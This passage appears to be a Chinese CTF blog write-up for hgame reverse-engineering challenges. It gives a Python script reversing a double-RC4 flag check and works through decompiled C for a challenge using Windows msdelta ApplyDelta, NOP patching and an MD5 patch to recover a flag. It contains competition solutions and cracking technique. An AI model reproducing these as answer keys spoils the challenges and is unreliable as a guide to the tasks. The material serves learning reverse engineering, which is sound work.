<p>里面一些函数无法跟进，我不知道是不是脱壳脱得地方不在jmp的问题，可以试试看，不过也可以猜出来那些函数的作用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204195539872.png" alt="image-20250204195539872"></p>
<p>看着像rc4,v12是7，v8没用到过，可以猜他俩是一起的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204195914123.png" alt="image-20250204195914123"></p>
<p>加密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250204200203826.png" alt="image-20250204200203826"></p>
<p>key</p>
<ol>
<li><strong>解析密钥加密过程</strong><ul>
<li>使用密钥<code>&quot;yekyek&quot;</code>初始化RC4的S盒，生成密钥流。</li>
<li>将预设的密文与密钥流异或，得到原始密钥。</li>
</ul>
</li>
<li><strong>解密Flag</strong><ul>
<li>使用上一步得到的正确密钥再次初始化RC4的S盒，生成40字节密钥流。</li>
<li>对v5数组中的密文逐字节加上密钥流的值（模256），得到原始flag。</li>
</ul>
</li>
</ol>
<p>再说详细点，看代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_401550(v11, v15, v4);</span><br><span class="line">sub_40163E(v9, v12, v4);</span><br></pre></td></tr></table></figure>

<p>v11生成v4，v4和我们输入的v9配合异或生成新的v4然后再到下面去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sub_403058(&quot;%s&quot;, v6);</span><br><span class="line">*(_DWORD *)&amp;v11[7] = 40;</span><br><span class="line">sub_401550(v10, v12, v4);</span><br><span class="line">sub_40175A(v6, *(unsigned int *)&amp;v11[7], v4);</span><br></pre></td></tr></table></figure>

<p>生成新的s盒v4密钥流，再去做减法操作(sub_40175A和sub_40163E只是从异或变成减法的区别)</p>
<p>因为要逆向，所以写代码时用加法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ksa</span>(<span class="params">key</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prga</span>(<span class="params">s, length</span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    keystream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        k = s[(s[i] + s[j]) % <span class="number">256</span>]</span><br><span class="line">        keystream.append(k)</span><br><span class="line">    <span class="keyword">return</span> keystream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密密钥部分</span></span><br><span class="line">key = <span class="string">b&quot;yekyek&quot;</span></span><br><span class="line">s_yekyek = ksa(key)</span><br><span class="line">keystream_yekyek = prga(s_yekyek, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">cipher_key = <span class="built_in">bytes</span>([<span class="number">0xCD</span>, <span class="number">0x8F</span>, <span class="number">0x25</span>, <span class="number">0x3D</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>])</span><br><span class="line">plain_key = <span class="built_in">bytes</span>([c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher_key, keystream_yekyek)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密得到的密钥: <span class="subst">&#123;plain_key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用密钥解密flag</span></span><br><span class="line">s_flag = ksa(plain_key)</span><br><span class="line">keystream_flag = prga(s_flag, <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># enc</span></span><br><span class="line">v5_cipher = [</span><br><span class="line">    <span class="number">0xF8</span>, <span class="number">0xD5</span>, <span class="number">0x62</span>, <span class="number">0xCF</span>, <span class="number">0x43</span>, <span class="number">0xBA</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x15</span>, <span class="number">0x4A</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x10</span>, <span class="number">0x27</span>, <span class="number">0x10</span>, <span class="number">0xB1</span>, <span class="number">0xCF</span>, <span class="number">0xC4</span>, <span class="number">0x09</span>, <span class="number">0xFE</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x9F</span>, <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xEA</span>, <span class="number">0x59</span>, <span class="number">0xC2</span>, <span class="number">0x07</span>, <span class="number">0x3B</span>, <span class="number">0xA9</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0xBC</span>, <span class="number">0xFD</span>, <span class="number">0x4B</span>, <span class="number">0x57</span>, <span class="number">0xC4</span>, <span class="number">0x7E</span>, <span class="number">0xD0</span>, <span class="number">0xAA</span>, <span class="number">0x0A</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密：c + k mod 256</span></span><br><span class="line">flag_bytes = <span class="built_in">bytes</span>([(c + k) % <span class="number">256</span> <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(v5_cipher, keystream_flag)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>就是两次rc4</p>
</blockquote>
<h3 id="Delta-Erro0000ors-复现"><a href="#Delta-Erro0000ors-复现" class="headerlink" title="Delta Erro0000ors [复现]"></a>Delta Erro0000ors [复现]</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE LibraryA; <span class="comment">// rax</span></span><br><span class="line">  DWORD LastError; <span class="comment">// eax</span></span><br><span class="line">  __int128 v6; <span class="comment">// [rsp+20h] [rbp-138h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-128h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [rsp+38h] [rbp-120h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-110h]</span></span><br><span class="line">  __int128 v10; <span class="comment">// [rsp+50h] [rbp-108h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+60h] [rbp-F8h]</span></span><br><span class="line">  __int128 v12; <span class="comment">// [rsp+70h] [rbp-E8h] BYREF</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+80h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">16</span>]; <span class="comment">// [rsp+90h] [rbp-C8h] BYREF</span></span><br><span class="line">  __int128 v15; <span class="comment">// [rsp+A0h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-A4h]</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">16</span>]; <span class="comment">// [rsp+B8h] [rbp-A0h]</span></span><br><span class="line">  __int128 v19; <span class="comment">// [rsp+C8h] [rbp-90h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+D8h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">16</span>]; <span class="comment">// [rsp+E0h] [rbp-78h] BYREF</span></span><br><span class="line">  __int128 v22; <span class="comment">// [rsp+F0h] [rbp-68h]</span></span><br><span class="line">  __int128 v23; <span class="comment">// [rsp+100h] [rbp-58h]</span></span><br><span class="line">  __int128 v24; <span class="comment">// [rsp+110h] [rbp-48h]</span></span><br><span class="line">  __int128 v25; <span class="comment">// [rsp+120h] [rbp-38h]</span></span><br><span class="line">  __int128 v26; <span class="comment">// [rsp+130h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [rsp+140h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  LibraryA = LoadLibraryA(<span class="string">&quot;msdelta.dll&quot;</span>);</span><br><span class="line">  hLibModule = LibraryA;</span><br><span class="line">  <span class="keyword">if</span> ( LibraryA )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_140005180 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(LibraryA, <span class="string">&quot;ApplyDeltaB&quot;</span>);</span><br><span class="line">    DeltaFree = (BOOL (__stdcall *)(LPVOID))GetProcAddress(hLibModule, <span class="string">&quot;DeltaFree&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;LoadLibrary Error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_OWORD *)Str1 = <span class="number">0</span>i64;</span><br><span class="line">  v22 = <span class="number">0</span>i64;</span><br><span class="line">  v23 = <span class="number">0</span>i64;</span><br><span class="line">  v24 = <span class="number">0</span>i64;</span><br><span class="line">  v25 = <span class="number">0</span>i64;</span><br><span class="line">  v26 = <span class="number">0</span>i64;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)Destination = <span class="number">0</span>i64;</span><br><span class="line">  v15 = <span class="number">0</span>i64;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)Buffer = <span class="number">0</span>i64;</span><br><span class="line">  v19 = <span class="number">0</span>i64;</span><br><span class="line">  v20 = <span class="number">0</span>i64;</span><br><span class="line">  sub_140001020(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  sub_140001080(<span class="string">&quot;%43s&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, <span class="string">&quot;hgame&#123;&quot;</span>, <span class="number">6u</span>i64) &amp;&amp; BYTE10(v23) == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(Destination, &amp;Str1[<span class="number">6</span>], <span class="number">0x24u</span>i64);</span><br><span class="line">    LODWORD(v9) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)&amp;v8 = Destination;</span><br><span class="line">    *((_QWORD *)&amp;v8 + <span class="number">1</span>) = <span class="number">37</span>i64;</span><br><span class="line">    LODWORD(v7) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)&amp;v6 = &amp;unk_1400050A0;</span><br><span class="line">    *((_QWORD *)&amp;v6 + <span class="number">1</span>) = <span class="number">69</span>i64;</span><br><span class="line">    v10 = v6;</span><br><span class="line">    v11 = v7;</span><br><span class="line">    v12 = v8;</span><br><span class="line">    v13 = v9;</span><br><span class="line">    <span class="keyword">if</span> ( qword_140005180(<span class="number">0</span>i64, &amp;v12, &amp;v10, &amp;qword_140005190) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140001020(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ApplyDelta Error&quot;</span>);</span><br><span class="line">      LastError = GetLastError();</span><br><span class="line">      RaiseException(LastError, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(aGreat);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64))DeltaFree)(qword_140005190);</span><br><span class="line">  FreeLibrary(hLibModule);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>E…一开始找半天也不知道怎么跑</p>
<p>后来看了下汇编代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250217144915204.png" alt="image-20250217144915204"></p>
<p>这里有一块Seven..并没有被反编译没可能哪里出错了</p>
<p>跳到这，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250217144938609.png" alt="image-20250217144938609"></p>
<p>直接把那块nop掉</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250217145058514.png" alt="image-20250217145058514"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  HMODULE LibraryA; // rax</span><br><span class="line">  DWORD LastError; // eax</span><br><span class="line">  char *v5; // rbx</span><br><span class="line">  char *v6; // rdi</span><br><span class="line">  __int64 v7; // rsi</span><br><span class="line">  <span class="built_in">int</span> v8; // ecx</span><br><span class="line">  __int64 v9; // r8</span><br><span class="line">  __int128 v11; // [rsp+20h] [rbp-138h]</span><br><span class="line">  __int64 v12; // [rsp+30h] [rbp-128h]</span><br><span class="line">  __int128 v13; // [rsp+38h] [rbp-120h]</span><br><span class="line">  __int64 v14; // [rsp+48h] [rbp-<span class="number">1</span>10h]</span><br><span class="line">  __int128 v15; // [rsp+50h] [rbp-108h] BYREF</span><br><span class="line">  __int64 v16; // [rsp+60h] [rbp-F8h]</span><br><span class="line">  __int128 v17; // [rsp+70h] [rbp-E8h] BYREF</span><br><span class="line">  __int64 v18; // [rsp+80h] [rbp-D8h]</span><br><span class="line">  char Destination[<span class="number">16</span>]; // [rsp+90h] [rbp-C8h] BYREF</span><br><span class="line">  __int128 v20; // [rsp+A0h] [rbp-B8h]</span><br><span class="line">  <span class="built_in">int</span> v21; // [rsp+B0h] [rbp-A8h]</span><br><span class="line">  char v22; // [rsp+B4h] [rbp-A4h]</span><br><span class="line">  char Buffer[<span class="number">16</span>]; // [rsp+B8h] [rbp-A0h] BYREF</span><br><span class="line">  __int128 v24; // [rsp+C8h] [rbp-90h]</span><br><span class="line">  __int64 v25; // [rsp+D8h] [rbp-80h]</span><br><span class="line">  char Str1[<span class="number">16</span>]; // [rsp+E0h] [rbp-78h] BYREF</span><br><span class="line">  __int128 v27; // [rsp+F0h] [rbp-68h]</span><br><span class="line">  __int128 v28; // [rsp+100h] [rbp-58h]</span><br><span class="line">  __int128 v29; // [rsp+<span class="number">1</span>10h] [rbp-48h]</span><br><span class="line">  __int128 v30; // [rsp+120h] [rbp-38h]</span><br><span class="line">  __int128 v31; // [rsp+130h] [rbp-28h]</span><br><span class="line">  <span class="built_in">int</span> v32; // [rsp+140h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  LibraryA = LoadLibraryA(<span class="string">&quot;msdelta.dll&quot;</span>);</span><br><span class="line">  hLibModule = LibraryA;</span><br><span class="line">  <span class="keyword">if</span> ( LibraryA )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_140005180 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(LibraryA, <span class="string">&quot;ApplyDeltaB&quot;</span>);</span><br><span class="line">    DeltaFree = (BOOL (__stdcall *)(LPVOID))GetProcAddress(hLibModule, <span class="string">&quot;DeltaFree&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;LoadLibrary Error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_OWORD *)Str1 = 0i64;</span><br><span class="line">  v27 = 0i64;</span><br><span class="line">  v28 = 0i64;</span><br><span class="line">  v29 = 0i64;</span><br><span class="line">  v30 = 0i64;</span><br><span class="line">  v31 = 0i64;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)Destination = 0i64;</span><br><span class="line">  v20 = 0i64;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)Buffer = 0i64;</span><br><span class="line">  v24 = 0i64;</span><br><span class="line">  v25 = 0i64;</span><br><span class="line">  sub_140001020(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  sub_140001080(<span class="string">&quot;%43s&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !strncmp(Str1, <span class="string">&quot;hgame&#123;&quot;</span>, 6ui64) &amp;&amp; BYTE10(v28) == <span class="number">125</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    strncpy(Destination, &amp;Str1[<span class="number">6</span>], 0x24ui64);</span><br><span class="line">    LODWORD(v14) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)&amp;v13 = Destination;</span><br><span class="line">    *((_QWORD *)&amp;v13 + <span class="number">1</span>) = 37i64;</span><br><span class="line">    LODWORD(v12) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)&amp;v11 = &amp;unk_1400050A0;</span><br><span class="line">    *((_QWORD *)&amp;v11 + <span class="number">1</span>) = 69i64;</span><br><span class="line">    v15 = v11;</span><br><span class="line">    v16 = v12;</span><br><span class="line">    v17 = v13;</span><br><span class="line">    v18 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( qword_140005180(0i64, &amp;v17, &amp;v15, &amp;qword_140005190) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140001020(<span class="string">&quot;%s&quot;</span>, (const char *)qword_140005190);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;ApplyDelta Error&quot;</span>);</span><br><span class="line">      LastError = GetLastError();</span><br><span class="line">      RaiseException(LastError, 1u, <span class="number">0</span>, 0i64);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;Seven eats the hash and causes the program to appear to have some kind of error.&quot;</span>);</span><br><span class="line">    puts(<span class="string">&quot;Seven wants to make up for the mistake, so she&#x27;s giving you a chance to patch the hash.&quot;</span>);</span><br><span class="line">    sub_140001020(<span class="string">&quot;input your MD5:&quot;</span>);</span><br><span class="line">    sub_140001080(<span class="string">&quot;%32s&quot;</span>);</span><br><span class="line">    v5 = Buffer;</span><br><span class="line">    v6 = (char *)&amp;unk_1400050B4;</span><br><span class="line">    v7 = 16i64;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1400010E0(v5, <span class="string">&quot;%02x&quot;</span>);</span><br><span class="line">      ++v6;</span><br><span class="line">      v5 += <span class="number">2</span>;</span><br><span class="line">      --v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 );</span><br><span class="line">    word_1400050C4 = <span class="number">31233</span>;</span><br><span class="line">    v17 = v11;</span><br><span class="line">    v18 = v12;</span><br><span class="line">    v15 = v13;</span><br><span class="line">    v16 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_140005180(0i64, &amp;v15, &amp;v17, &amp;qword_140005190) )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;You didn&#x27;t take advantage of this opportunity.&quot;</span>);</span><br><span class="line">      sub_1400014E0();</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v9 = 0i64;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_140003438[v9] != ((unsigned __int8)Str1[v9] ^ *(_BYTE *)(v8 % (unsigned __int64)qword_140005198</span><br><span class="line">                                                                       + qword_140005190)) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(<span class="string">&quot;Flag is error!!&quot;</span>);</span><br><span class="line">        sub_1400014E0();</span><br><span class="line">        exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v8;</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt; <span class="number">43</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  puts(aGreat);</span><br><span class="line">  DeltaFree((LPVOID)qword_140005190);</span><br><span class="line">  FreeLibrary(hLibModule);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://1k0ct.github.io/2024/04/29/Windows%E5%B7%AE%E5%BC%82%E5%8C%96%E8%A1%A5%E4%B8%81MSDelta%E4%B9%8B%E7%A0%94%E7%A9%B6/">Windows差异化补丁MSDelta之研究 | Ikoct的饮冰室</a></p>
<p>打补丁这个方法没理解，好像是大概hash被修改了，我们以补丁方式将其改成正确的hash?</p>
<p>看了官解才发现自己忽略了一个至关重要的地方，或者说根本没理解代码，下次注意</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序给了我们一次回填被修改的hash的机会</span><br><span class="line">程序会拿增量之后的内容加密flag，比较密文。</span><br><span class="line">只需要根据从内存中找到的内容，计算一下md5回填回去</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250220213046763.png" alt="image-20250220213046763"></p>
<p>我之前想动调找hash根本没有调到这里，自然不会找到hash</p>
<p>填入MD5后</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250221121140077.png" alt="image-20250221121140077"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250221121544961.png" alt="image-20250221121544961"></p>
<p>为很么要找seven呢?</p>
<p>因为后面的异或逻辑我们知道key的前几个肯定是Seven，所以可以根据这个找</p>
<blockquote>
